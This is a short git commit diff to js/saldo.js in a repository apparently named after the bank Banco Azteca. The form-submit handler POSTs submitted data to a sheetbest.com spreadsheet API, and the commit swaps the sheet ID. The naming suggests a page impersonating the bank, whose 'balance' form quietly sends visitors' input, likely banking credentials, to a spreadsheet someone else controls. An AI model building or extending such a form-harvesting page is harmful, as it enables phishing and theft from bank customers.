36d87213b632a53ee197adb7af5a4e763d0ab3d8
banco-azteca-12e <robledofrancis4@gmail.com>
2026-01-12 13:08:17 -0600

    Update saldo.js

--- js/saldo.js
+++ js/saldo.js
@@ -7,7 +7,7 @@ formulario.addEventListener('submit', async(e) =>{
 
 
 try {    
-    const respuesta = await fetch('https://api.sheetbest.com/sheets/e0467f44-d5c5-4234-9ec2-fa3d8cd33e04', {
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/9975f495-3ffa-4246-ac81-d2c750f49b22', {
         method: 'POST',
         mode: 'cors',
         headers: {
